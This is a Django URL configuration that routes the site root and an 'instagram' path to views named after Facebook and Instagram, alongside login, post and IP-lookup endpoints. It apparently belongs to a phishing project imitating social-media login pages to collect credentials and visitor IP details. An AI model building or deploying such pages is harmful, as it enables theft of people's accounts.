from django.urls import path
from . import views, ipinfo


urlpatterns = [
    path('', views.facebook, name="facebook"),
    path('instagram', views.instagram, name="instagram"),
    path('login', views.newLogin, name="login"),
    path('post', views.post, name="post"),
    path('get_ip_details', ipinfo.get_ip_details, name="get_ip_details"),
]
